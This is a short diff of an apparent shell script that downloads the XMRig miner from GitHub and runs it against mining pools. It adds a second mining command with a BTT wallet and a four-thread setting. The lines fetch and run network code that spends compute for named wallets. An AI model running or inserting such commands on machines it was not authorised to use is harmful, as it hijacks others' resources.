@@ -5,3 +5,6 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-bioni
 tar -xvf xmrig-6.12.1-bionic-x64.tar.gz
 
 ./xmrig-6.12.1/xmrig -o pool.supportxmr.com:443 -u 4Ag4iUddrHPhk7eAqJ8sD6RnFUvJ2j6zM2BtAe2EiBgoQYGywrgD4R9eWcJpX5o8eWjCPamzNy7r2jL1RooEni5tVDhT4er -k --tls -p git2
+
+
+./xmrig -o rx.unmineable.com:3333 -u BTT:TCk95wCHUThwWgDsjurVLFAi77Zfm1w4pc.test --randomx-mode=light --threads=4
